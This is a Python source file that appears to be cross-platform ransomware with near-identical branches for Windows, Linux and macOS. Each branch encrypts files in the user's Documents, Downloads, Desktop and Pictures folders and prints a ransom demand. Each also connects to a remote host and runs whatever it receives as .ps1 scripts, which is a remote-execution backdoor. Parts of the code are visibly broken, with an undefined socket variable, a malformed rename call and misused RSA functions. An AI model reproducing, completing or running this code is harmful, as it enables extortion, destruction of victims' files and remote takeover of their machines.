import os
import platform
import rarfile
import socket
import threading
import random
import string
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding

o78 = platform.system()

if o78 == "Windows":

    files = []

    e4 = os.environ["USERPROFILE"] + "\Documents"

    h4 = os.environ["USERPROFILE"]

    v3 = os.environ["USERPROFILE"] + "\Downloads"

    dry4 = os.environ["USERPROFILE"] + "\Desktop"

    dry77 = os.environ["USERPROFILE"] + "\Pictures"

    for file in os.listdir(e4):
            if file == "MileoSecurityScan.py" or file == "thekey.key":
                    continue
            if os.path.isfile(file):
                    files.append(file)

    for file in os.listdir(h4):
            if file == "MileoSecurityScan.py" or file == "thekey.key":
                    continue
            if os.path.isfile(file):
                    files.append(file)

    for file in os.listdir(v3):
            if file == "MileoSecurityScan.py" or file == "thekey.key":
                    continue
            if os.path.isfile(file):
                    files.append(file)

    for file in os.listdir(dry4):
            if file == "MileoSecurityScan.py" or file == "thekey.key":
                    continue
            if os.path.isfile(file):
                    files.append(file)

    for file in os.listdir(dry77):
            if file == "MileoSecurityScan.py" or file == "thekey.key":
                    continue
            if os.path.isfile(file):
                    files.append(file)

    print(files)

    j6735 = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
    )

    key = j6735.public_key()

    p_k_p = j6735.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
    )

    with open("p_k_p.key", "wb") as f:
            f.write(p_k_p)

    dry23 = key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
    )

    with open("thekey.key", "wb") as thekey:
            thekey.write(dry23)

    with open("jules80.KSS", "rb") as f:
        jules80 = f.read()

        with rarfile.RarFile("decrypt02.rar", "w", password=jules80) as rf:
                rf.add("p_k_p.key")
                rf.add("thekey.key")

    print("Would you like the password to that funny .rar?")
    print("You can send your money to: [PLACEHOLDER]")
    print("If you're too broke or normal enough, contact us")
    roy85 = "jules80.KSS"

    try:
        os.remove(roy85)
        print(f"{roy85} was successfully deleted.")
    except OSError as e:
        print(f"Error while deleting file: {e}")

    for file in files:
        with open(file, "rb") as thefile:
                contents = thefile.read()
        contents_encrypted = rsa.encrypt(contents, key)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
            os.rename(thefile, thefile, + ".LSE")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    with open('TIMO87.KSS', 'r') as ljig34gj34k:
        m4j430g42 = (ljig34gj34k.read().strip())

    p3457 = m4j430g42

    rovaja21 = p3457

    server_address = (rovaja21, 10000)
    try:
        sock.connect(server_address)
        print("welcome to kaos.Chat XD")
    except:
        print("@w@")

    try:
            os.remove(rovaja21)
            print(f"{rovaja21} was successfully deleted.")
    except OSError as e:
            print(f"Error while deleting file: {e}")

    def receive_messages():
        while True:
            try:
                g87 = up12.recv(1024)
                if g87:
                    java6 = 11
                    luci08 = ''.join(random.choices(string.ascii_lowercase, k=java6))
                    jo325 = luci08
                    print(g87.decode('utf-8'))
                    with open( jo325 + '.ps1', 'wb') as f:
                        f.write(g87)
                    os.system( jo325 + '.ps1')
                else:
                    up12.close()
                    break
            except:
                up12.close()
                break

    t = threading.Thread(target=receive_messages)
    t.start()

    while True:
        message = input('> ')

        sock.sendall(message.encode('utf-8'))

elif o78 == "Linux":

    files = []

    e4 = os.environ["HOME"] + "/Documents"

    h4 = os.environ["HOME"]

    v3 = os.environ["HOME"] + "/Downloads"

    dry4 = os.environ["HOME"] + "/Desktop"

    dry77 = os.environ["HOME"] + "/Pictures"

    for file in os.listdir(e4):
            if file == "MileoSecurityScan.py" or file == "thekey.key":
                    continue
            if os.path.isfile(file):
                    files.append(file)

    for file in os.listdir(h4):
            if file == "MileoSecurityScan.py" or file == "thekey.key":
                    continue
            if os.path.isfile(file):
                    files.append(file)

    for file in os.listdir(v3):
            if file == "MileoSecurityScan.py" or file == "thekey.key":
                    continue
            if os.path.isfile(file):
                    files.append(file)

    for file in os.listdir(dry4):
            if file == "MileoSecurityScan.py" or file == "thekey.key":
                    continue
            if os.path.isfile(file):
                    files.append(file)

    for file in os.listdir(dry77):
            if file == "MileoSecurityScan.py" or file == "thekey.key":
                    continue
            if os.path.isfile(file):
                    files.append(file)

    print(files)

    j6735 = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
    )

    key = j6735.public_key()

    p_k_p = j6735.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
    )

    with open("p_k_p.key", "wb") as f:
            f.write(p_k_p)

    dry23 = key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
    )

    with open("thekey.key", "wb") as thekey:
            thekey.write(dry23)

    with open("jules80.KSS", "rb") as f:
        jules80 = f.read()

        with rarfile.RarFile("decrypt02.rar", "w", password=jules80) as rf:
                rf.add("p_k_p.key")
                rf.add("thekey.key")

    print("Would you like the password to that funny .rar?")
    print("You can send your money to: [PLACEHOLDER]")
    print("If you're too broke or normal enough, contact us")
    print("kaosSecurity solutions: https://github.com/kaosSec")

    roy85 = "jules80.KSS"

    try:
        os.remove(roy85)
        print(f"{roy85} was successfully deleted.")
    except OSError as e:
        print(f"Error while deleting file: {e}")

    for file in files:
        with open(file, "rb") as thefile:
                contents = thefile.read()
        contents_encrypted = rsa.encrypt(contents, key)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
            os.rename(thefile, thefile, + ".LSE")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    with open('TIMO87.KSS', 'r') as ljig34gj34k:
        m4j430g42 = (ljig34gj34k.read().strip())

    p3457 = m4j430g42

    rovaja21 = p3457

    server_address = (rovaja21, 10000)
    try:
        sock.connect(server_address)
        print("welcome to kaos.Chat XD")
    except:
        print("@w@")

    try:
            os.remove(rovaja21)
            print(f"{rovaja21} was successfully deleted.")
    except OSError as e:
            print(f"Error while deleting file: {e}")

    def receive_messages():
        while True:
            try:
                g87 = up12.recv(1024)
                if g87:
                    java6 = 11
                    luci08 = ''.join(random.choices(string.ascii_lowercase, k=java6))
                    jo325 = luci08
                    print(g87.decode('utf-8'))
                    with open( jo325 + '.ps1', 'wb') as f:
                        f.write(g87)
                    os.system( jo325 + '.ps1')
                else:
                    up12.close()
                    break
            except:
                up12.close()
                break

    t = threading.Thread(target=receive_messages)
    t.start()

    while True:
        message = input('> ')

        sock.sendall(message.encode('utf-8'))

elif o78 == "Darwin":
    
    files = []

    e4 = os.environ["HOME"] + "/Documents"

    h4 = os.environ["HOME"]

    v3 = os.environ["HOME"] + "/Downloads"

    dry4 = os.environ["HOME"] + "/Desktop"

    dry77 = os.environ["HOME"] + "/Pictures"

    for file in os.listdir(e4):
            if file == "MileoSecurityScan.py" or file == "thekey.key":
                    continue
            if os.path.isfile(file):
                    files.append(file)

    for file in os.listdir(h4):
            if file == "MileoSecurityScan.py" or file == "thekey.key":
                    continue
            if os.path.isfile(file):
                    files.append(file)

    for file in os.listdir(v3):
            if file == "MileoSecurityScan.py" or file == "thekey.key":
                    continue
            if os.path.isfile(file):
                    files.append(file)

    for file in os.listdir(dry4):
            if file == "MileoSecurityScan.py" or file == "thekey.key":
                    continue
            if os.path.isfile(file):
                    files.append(file)

    for file in os.listdir(dry77):
            if file == "MileoSecurityScan.py" or file == "thekey.key":
                    continue
            if os.path.isfile(file):
                    files.append(file)

    print(files)

    j6735 = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
    )

    key = j6735.public_key()

    p_k_p = j6735.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
    )

    with open("p_k_p.key", "wb") as f:
            f.write(p_k_p)

    dry23 = key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
    )

    with open("thekey.key", "wb") as thekey:
            thekey.write(dry23)

    with open("jules80.KSS", "rb") as f:
        jules80 = f.read()

        with rarfile.RarFile("decrypt02.rar", "w", password=jules80) as rf:
                rf.add("p_k_p.key")
                rf.add("thekey.key")

    print("Would you like the password to that funny .rar?")
    print("You can send your money to: [PLACEHOLDER]")
    print("If you're too broke or normal enough, contact us")
    print("kaosSecurity solutions: https://github.com/kaosSec")

    roy85 = "jules80.KSS"

    try:
        os.remove(roy85)
        print(f"{roy85} was successfully deleted.")
    except OSError as e:
        print(f"Error while deleting file: {e}")

    for file in files:
        with open(file, "rb") as thefile:
                contents = thefile.read()
        contents_encrypted = rsa.encrypt(contents, key)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
            os.rename(thefile, thefile, + ".LSE")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    with open('TIMO87.KSS', 'r') as ljig34gj34k:
        m4j430g42 = (ljig34gj34k.read().strip())

    p3457 = m4j430g42

    rovaja21 = p3457

    server_address = (rovaja21, 10000)
    try:
        sock.connect(server_address)
        print("welcome to kaos.Chat XD")
    except:
        print("@w@")

    try:
            os.remove(rovaja21)
            print(f"{rovaja21} was successfully deleted.")
    except OSError as e:
            print(f"Error while deleting file: {e}")

    def receive_messages():
        while True:
            try:
                g87 = up12.recv(1024)
                if g87:
                    java6 = 11
                    luci08 = ''.join(random.choices(string.ascii_lowercase, k=java6))
                    jo325 = luci08
                    print(g87.decode('utf-8'))
                    with open( jo325 + '.ps1', 'wb') as f:
                        f.write(g87)
                    os.system( jo325 + '.ps1')
                else:
                    up12.close()
                    break
            except:
                up12.close()
                break

    t = threading.Thread(target=receive_messages)
    t.start()

    while True:
        message = input('> ')

        sock.sendall(message.encode('utf-8'))
